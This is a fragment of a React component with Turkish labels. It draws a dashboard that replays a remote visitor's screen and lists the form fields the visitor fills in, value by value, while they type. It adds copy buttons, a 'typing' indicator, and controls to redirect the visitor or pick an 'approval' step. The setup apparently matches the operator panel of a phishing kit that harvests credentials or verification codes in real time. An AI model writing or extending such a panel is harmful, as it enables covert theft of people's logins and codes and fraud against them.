          <div className="flex items-center gap-2">
            {/* FRAME MODE TOGGLE */}
            <div
              className={`flex items-center p-0.5 rounded-xl border text-xs font-medium ${
                darkMode ? "bg-black/40 border-white/10" : "bg-white border-gray-200"
              }`}
            >
              <button
                onClick={() => setFrameMode("mobile")}
                className={`px-2.5 py-1 rounded-lg transition-all flex items-center gap-1 ${
                  frameMode === "mobile"
                    ? darkMode
                      ? "bg-white/20 text-white font-bold"
                      : "bg-black text-white font-bold"
                    : "opacity-60 hover:opacity-100"
                }`}
                title="Mobil Telefon Görünümü"
              >
                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" />
                </svg>
                <span>Mobil</span>
              </button>
              <button
                onClick={() => setFrameMode("desktop")}
                className={`px-2.5 py-1 rounded-lg transition-all flex items-center gap-1 ${
                  frameMode === "desktop"
                    ? darkMode
                      ? "bg-white/20 text-white font-bold"
                      : "bg-black text-white font-bold"
                    : "opacity-60 hover:opacity-100"
                }`}
                title="Masaüstü Görünümü"
              >
                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
                <span>Masaüstü</span>
              </button>
              <button
                onClick={() => setFrameMode("fit")}
                className={`px-2.5 py-1 rounded-lg transition-all flex items-center gap-1 ${
                  frameMode === "fit"
                    ? darkMode
                      ? "bg-white/20 text-white font-bold"
                      : "bg-black text-white font-bold"
                    : "opacity-60 hover:opacity-100"
                }`}
                title="Doğal Çözünürlük"
              >
                <svg className="w-3.5 h-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4" />
                </svg>
                <span>Doğal</span>
              </button>
            </div>

            {/* SCALE CONTROLS */}
            <div
              className={`flex items-center px-1 py-0.5 rounded-xl border text-xs ${
                darkMode ? "bg-black/40 border-white/10" : "bg-white border-gray-200"
              }`}
            >
              <button
                onClick={() => setScale((s) => Math.max(0.4, Number((s - 0.1).toFixed(2))))}
                className="px-1.5 py-0.5 opacity-70 hover:opacity-100 font-bold"
                title="Uzaklaştır"
              >
                -
              </button>
              <span className="px-1 font-mono text-[11px] opacity-80">{Math.round(scale * 100)}%</span>
              <button
                onClick={() => setScale((s) => Math.min(1.4, Number((s + 0.1).toFixed(2))))}
                className="px-1.5 py-0.5 opacity-70 hover:opacity-100 font-bold"
                title="Yakınlaştır"
              >
                +
              </button>
            </div>

            {/* REFRESH BUTTON */}
            <button
              onClick={handleRequestRefresh}
              className={`p-2 rounded-xl border transition-all ${
                darkMode
                  ? "bg-white/5 border-white/10 hover:bg-white/15 text-white"
                  : "bg-white border-gray-200 hover:bg-gray-100 text-gray-800"
              }`}
              title="Kullanıcıdan yeni ekran görüntüsü iste"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M4 4v5h.582m15.356 2A8.001 8.001 0 004.582 9m0 0H9m11 11v-5h-.581m0 0a8.003 8.003 0 01-15.357-2m15.357 2H15" />
              </svg>
            </button>

            {/* FULLSCREEN TOGGLE */}
            <button
              onClick={() => setIsFullscreen(!isFullscreen)}
              className={`p-2 rounded-xl border transition-all ${
                darkMode
                  ? "bg-white/5 border-white/10 hover:bg-white/15 text-white"
                  : "bg-white border-gray-200 hover:bg-gray-100 text-gray-800"
              }`}
              title={isFullscreen ? "Tam Ekrandan Çık" : "Tam Ekran Yap"}
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  strokeWidth={2}
                  d={
                    isFullscreen
                      ? "M9 9L4 4m0 0l5 0m-5 0l0 5m6 6l5 5m0 0l-5 0m5 0l0-5"
                      : "M4 8V4m0 0h4M4 4l5 5m11-1V4m0 0h-4m4 0l-5 5M4 16v4m0 0h4m-4 0l5-5m11 5l-5-5m5 5v-4m0 4h-4"
                  }
                />
              </svg>
            </button>

            {/* CLOSE BUTTON */}
            <button
              onClick={onClose}
              className={`p-2 rounded-xl transition-all ${
                darkMode
                  ? "bg-red-500/10 text-red-400 hover:bg-red-500 hover:text-white border border-red-500/20"
                  : "bg-red-50 text-red-600 hover:bg-red-600 hover:text-white border border-red-200"
              }`}
              title="Kapat (Esc)"
            >
              <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2.5} d="M6 18L18 6M6 6l12 12" />
              </svg>
            </button>
          </div>
        </div>

        {/* SUBHEADER: LIVE CONTROLS (AKSİYON SEÇİN & ONAY SEÇİN) + ROUTE INFO */}
        <div
          className={`flex flex-wrap items-center justify-between gap-3 px-5 py-2.5 text-xs border-b ${
            darkMode ? "bg-black/30 border-white/5 text-gray-300" : "bg-gray-100/70 border-gray-200 text-gray-700"
          }`}
        >
          {/* LEFT: CURRENT ROUTE */}
          <div className="flex items-center gap-2 overflow-hidden">
            <span className="font-semibold opacity-60">Aktif Sayfa:</span>
            <code className="px-2 py-0.5 rounded font-mono font-bold text-[11px] bg-cyan-500/10 text-cyan-500 border border-cyan-500/20">
              {currentPath}
            </code>
          </div>

          {/* CENTER: ACTION FEEDBACK */}
          <div className="flex items-center gap-2">
            {actionFeedback && (
              <span className="flex items-center gap-1 px-3 py-1 rounded-full text-xs font-black uppercase tracking-wider bg-emerald-500 text-black shadow-md animate-bounce">
                <span>✓</span>
                <span>{actionFeedback}</span>
              </span>
            )}
          </div>

          {/* RIGHT: RESOLUTION & STATS */}
          <div className="flex items-center gap-4 text-[11px] font-mono opacity-80">
            <span>Çözünürlük: {viewportWidth}x{viewportHeight}</span>
            <span>Olaylar: {eventCount}</span>
            {lastActivityAt && (
              <span>Son: {Math.max(0, Math.round((Date.now() - lastActivityAt) / 1000))}s önce</span>
            )}
          </div>
        </div>

        {/* MAIN BODY: SCREEN + ACTIVITY PANEL */}
        <div className="flex-1 flex flex-col lg:flex-row overflow-hidden relative">
          {/* SCREEN REPLAY AREA */}
          <div
            className={`flex-1 flex items-center justify-center overflow-auto p-4 relative ${
              darkMode ? "bg-[#0b0b0d]" : "bg-[#f3f4f6]"
            }`}
          >
            {/* WAITING / SCANNING OVERLAY WHEN NO SCREEN YET */}
            {eventCount === 0 && (
              <div className="absolute inset-0 z-10 flex flex-col items-center justify-center p-6 text-center select-none backdrop-blur-xs">
                <div className="relative mb-5">
                  <div className="w-16 h-16 rounded-full border-2 border-emerald-500/20 animate-ping absolute inset-0"></div>
                  <div className="w-16 h-16 rounded-full border-2 border-emerald-500/40 animate-pulse flex items-center justify-center bg-emerald-500/10">
                    <svg className="w-8 h-8 text-emerald-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.8} d="M15 10l4.553-2.276A1 1 0 0121 8.618v6.764a1 1 0 01-1.447.894L15 14M5 18h8a2 2 0 002-2V8a2 2 0 00-2-2H5a2 2 0 00-2 2v8a2 2 0 002 2z" />
                    </svg>
                  </div>
                </div>
                <h3 className="text-base font-bold mb-1">
                  {connectionStatus === "offline"
                    ? "Kullanıcı Şu Anda Çevrimdışı"
                    : "Canlı Yayın Bekleniyor..."}
                </h3>
                <p className="text-xs opacity-70 max-w-md">
                  {connectionStatus === "offline"
                    ? "Kullanıcı siteye girdiğinde veya sayfada işlem yaptığında canlı ekran otomatik olarak burada görünecektir."
                    : "Kullanıcının tarayıcısına canlı izleme sinyali gönderildi. İlk ekran karesi aktarılıyor..."}
                </p>
                <button
                  onClick={handleRequestRefresh}
                  className="mt-4 px-4 py-1.5 rounded-full text-xs font-bold bg-emerald-500 text-white shadow-lg hover:bg-emerald-600 transition-all"
                >
                  Yeniden İstek Gönder
                </button>
              </div>
            )}

            {/* SCREEN VIEWPORT CONTAINER */}
            <div
              style={{
                transform: `scale(${scale})`,
                transformOrigin: "center center",
                transition: "transform 0.15s ease-out",
              }}
              className="flex items-center justify-center"
            >
              {frameMode === "mobile" ? (
                /* SMARTPHONE MOCKUP FRAME */
                <div
                  className="relative rounded-[50px] p-3 shadow-[0_25px_60px_-15px_rgba(0,0,0,0.5)] border-[8px] border-zinc-800 bg-zinc-950 flex flex-col items-center"
                  style={{
                    width: 412,
                    height: 864,
                  }}
                >
                  {/* Dynamic Island / Speaker Notch */}
                  <div className="absolute top-4 left-1/2 -translate-x-1/2 w-24 h-4 bg-zinc-900 rounded-full z-20 flex items-center justify-center gap-1.5 pointer-events-none">
                    <div className="w-2.5 h-2.5 rounded-full bg-zinc-950" />
                    <div className="w-1.5 h-1.5 rounded-full bg-blue-900/40" />
                  </div>

                  {/* Phone Screen Canvas */}
                  <div
                    ref={playerContainerRef}
                    className="live-player-screen w-[390px] h-[844px] rounded-[38px] overflow-hidden bg-[#021a0e] relative"
                  />

                  {/* Home Indicator Bar */}
                  <div className="absolute bottom-2 left-1/2 -translate-x-1/2 w-32 h-1 bg-white/40 rounded-full z-20 pointer-events-none" />
                </div>
              ) : frameMode === "desktop" ? (
                /* DESKTOP BROWSER FRAME */
                <div
                  className={`rounded-2xl shadow-2xl border overflow-hidden flex flex-col ${
                    darkMode ? "bg-zinc-900 border-white/10" : "bg-white border-zinc-300"
                  }`}
                  style={{
                    width: 1100,
                    height: 720,
                  }}
                >
                  {/* Browser Window Header */}
                  <div className="flex items-center gap-2 px-4 py-2 border-b border-black/10 bg-black/5 dark:bg-white/5">
                    <div className="flex gap-1.5">
                      <div className="w-3 h-3 rounded-full bg-red-500" />
                      <div className="w-3 h-3 rounded-full bg-amber-500" />
                      <div className="w-3 h-3 rounded-full bg-emerald-500" />
                    </div>
                    <div className="flex-1 mx-4 px-3 py-1 rounded-md text-[11px] font-mono opacity-60 bg-black/5 dark:bg-white/5 truncate">
                      https://iki.lt{currentPath}
                    </div>
                  </div>

                  {/* Desktop Content */}
                  <div
                    ref={playerContainerRef}
                    className="live-player-screen w-full flex-1 overflow-auto bg-[#021a0e] relative"
                  />
                </div>
              ) : (
                /* FIT / NATIVE VIEWPORT */
                <div
                  className="rounded-xl shadow-2xl border overflow-hidden bg-[#021a0e] relative"
                  style={{
                    width: viewportWidth,
                    height: viewportHeight,
                  }}
                >
                  <div ref={playerContainerRef} className="live-player-screen w-full h-full relative" />
                </div>
              )}
            </div>
          </div>

          {/* RIGHT SIDEBAR: DYNAMIC LIVE FIELD CARDS */}
          <div
            className={`w-full lg:w-[420px] border-t lg:border-t-0 lg:border-l flex flex-col ${
              darkMode ? "bg-[#141416] border-white/10" : "bg-white border-gray-200"
            }`}
          >
            {/* HEADER */}
            <div className="flex items-center gap-1.5 border-b border-black/10 dark:border-white/10 px-4 py-3 text-xs font-bold">
              <span className="w-2 h-2 rounded-full bg-emerald-500 animate-pulse" />
              <span>Canlı Form Alanları ({activeFieldKeys.length})</span>
            </div>

            {/* DYNAMIC FIELD CARDS */}
            {
              <div className="flex-1 overflow-y-auto p-3 space-y-3">
                {/* QUICK REDIRECT & APPROVAL CONTROLS IN SIDEBAR */}
                <div
                  className={`p-3 rounded-2xl border space-y-2 ${
                    darkMode ? "bg-white/[0.03] border-white/10" : "bg-gray-50 border-gray-200"
                  }`}
                >
                  <div className="text-[10px] font-black uppercase tracking-wider opacity-60">
                    Hızlı Yönlendirme ve Onay
                  </div>
                  <div className="grid grid-cols-2 gap-2">
                    <select
                      value=""
                      onChange={(e) => {
                        if (e.target.value) {
                          void handleActionSelect(e.target.value);
                          e.target.value = "";
                        }
                      }}
                      className={`w-full rounded-xl border px-2.5 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
                        darkMode
                          ? "bg-black/50 border-white/10 text-amber-400 focus:border-[#EB5E28]"
                          : "bg-white border-gray-200 text-amber-600 focus:border-[#EB5E28]"
                      }`}
                    >
                      <option value="">Aksiyon Seç...</option>
                      {ROUTE_OPTIONS.map((opt) => (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}
                        </option>
                      ))}
                    </select>

                    <select
                      value=""
                      onChange={(e) => {
                        if (e.target.value) {
                          void handleApprovalSelect(e.target.value);
                          e.target.value = "";
                        }
                      }}
                      className={`w-full rounded-xl border px-2.5 py-1.5 text-xs font-bold outline-none cursor-pointer transition-all ${
                        darkMode
                          ? "bg-black/50 border-white/10 text-emerald-400 focus:border-emerald-500"
                          : "bg-white border-gray-200 text-emerald-600 focus:border-emerald-500"
                      }`}
                    >
                      <option value="">Onay Seç...</option>
                      {APPROVAL_OPTIONS.map((opt) => (
                        <option key={opt.value} value={opt.value}>
                          {opt.label}
                        </option>
                      ))}
                    </select>
                  </div>
                </div>

                {activeFieldKeys.length === 0 ? (
                  <div className="py-20 text-center px-4">
                    <div className="w-12 h-12 rounded-2xl bg-emerald-500/10 text-emerald-500 flex items-center justify-center mx-auto mb-3">
                      <svg className="w-6 h-6 animate-pulse" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                        <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
                      </svg>
                    </div>
                    <h4 className="text-sm font-bold mb-1">Henüz Form Girişi Yok</h4>
                    <p className="text-xs opacity-60 max-w-xs mx-auto">
                      Kullanıcı hangi sayfada hangi alana tıklayıp yazarsa, o alan anlık olarak burada belirecek.
                    </p>
                  </div>
                ) : (
                  <div className="space-y-2.5">
                    {activeFieldKeys.map((fKey) => {
                      const icon = getFieldIcon(fKey);
                      const val = liveFields[fKey] || "";
                      const isFocused = currentlyFocusedField === fKey;
                      const isFilled = Boolean(val && val.trim().length > 0);

                      return (
                        <div
                          key={fKey}
                          className={`rounded-2xl border p-3.5 transition-all ${
                            isFocused
                              ? "border-emerald-500/80 bg-emerald-500/10 shadow-[0_0_15px_rgba(16,185,129,0.2)]"
                              : isFilled
                              ? darkMode
                                ? "bg-white/[0.04] border-white/10"
                                : "bg-gray-50 border-gray-200"
                              : darkMode
                              ? "bg-black/20 border-white/5 opacity-70"
                              : "bg-gray-50/50 border-gray-100 opacity-70"
                          }`}
                        >
                          {/* FIELD TITLE & STATUS */}
                          <div className="flex items-center justify-between gap-2 mb-2">
                            <div className="flex items-center gap-2 min-w-0">
                              <span className="text-base">{icon}</span>
                              <span className="text-xs font-bold uppercase tracking-wider text-amber-400 truncate">
                                {fKey}
                              </span>
                            </div>

                            <div className="flex items-center gap-1.5 shrink-0">
                              {isFocused ? (
                                <span className="flex items-center gap-1 px-2.5 py-0.5 rounded-full text-[9px] font-black uppercase tracking-wider bg-emerald-500 text-black animate-pulse">
                                  <span className="w-1.5 h-1.5 rounded-full bg-black" />
                                  Yazıyor...
                                </span>
                              ) : isFilled ? (
                                <span className="flex items-center gap-1 px-2 py-0.5 rounded-full text-[9px] font-bold uppercase tracking-wider bg-emerald-500/15 text-emerald-500 border border-emerald-500/30">
                                  Girildi
                                </span>
                              ) : (
                                <span className="text-[10px] opacity-40 font-mono">Bekleniyor</span>
                              )}

                              {isFilled && (
                                <button
                                  onClick={() => handleCopy(fKey, val)}
                                  className={`px-2 py-0.5 rounded-lg text-[10px] font-bold transition-all ${
                                    copiedField === fKey
                                      ? "bg-emerald-500 text-white"
                                      : darkMode
                                      ? "bg-white/10 hover:bg-white/20 text-gray-300"
                                      : "bg-gray-200 hover:bg-gray-300 text-gray-700"
                                  }`}
                                  title="Kopyala"
                                >
                                  {copiedField === fKey ? "✓ Alındı" : "Kopyala"}
                                </button>
                              )}
                            </div>
                          </div>

                          {/* INSTANT VALUE DISPLAY */}
                          <div
                            className={`font-mono text-sm sm:text-base font-extrabold px-3.5 py-2.5 rounded-xl border select-all break-words ${
                              isFilled
                                ? darkMode
                                  ? "bg-black/50 border-white/10 text-white font-bold"
                                  : "bg-white border-gray-200 text-gray-900 shadow-inner"
                                : darkMode
                                ? "bg-black/30 border-white/5 text-gray-600 italic font-normal text-xs py-2"
                                : "bg-white/60 border-gray-100 text-gray-400 italic font-normal text-xs py-2"
                            }`}
                          >
                            {val || "Yazı bekleniyor..."}
                          </div>
                        </div>
                      );
                    })}
                  </div>
                )}
              </div>
            }
          </div>
        </div>
      </div>
    </div>
  );
}
